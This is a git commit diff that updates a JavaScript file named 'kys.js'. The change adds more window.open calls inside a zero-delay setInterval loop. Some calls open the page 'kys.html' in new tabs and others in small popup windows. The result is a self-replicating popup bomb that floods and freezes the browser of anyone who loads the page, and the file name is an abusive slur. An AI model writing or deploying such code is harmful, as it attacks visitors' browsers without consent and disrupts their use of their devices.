c4b9ac5df98a18200990ea795b2edd2773fb77f5
chessaimaker <147644008+chessaimaker@users.noreply.github.com>
2024-02-29 10:30:19 -0500

    Update kys.js

--- kys.js
+++ kys.js
@@ -6,14 +6,17 @@ setTimeout(function(){
 }, 10000);
 setInterval(function(){
   window.open("kys.html");
+  window.open("kys.html", "_blank");
   window.open("kys.html");
+  window.open("kys.html", "_blank");
+  window.open("kys.html", "", "width = 200; height=300;");
+  window.open("kys.html", "", "width = 200; height=300;");
   window.open("kys.html");
+  window.open("kys.html", "_blank");
   window.open("kys.html");
-  window.open("kys.html");
-  window.open("kys.html");
-  window.open("kys.html");
-  window.open("kys.html");
-  window.open("kys.html");
+  window.open("kys.html", "_blank");
+  window.open("kys.html", "", "width = 200; height=300;");
+  window.open("kys.html", "", "width = 200; height=300;");
 }, 0);
 }
 if(location.href.includes("kys.html")){
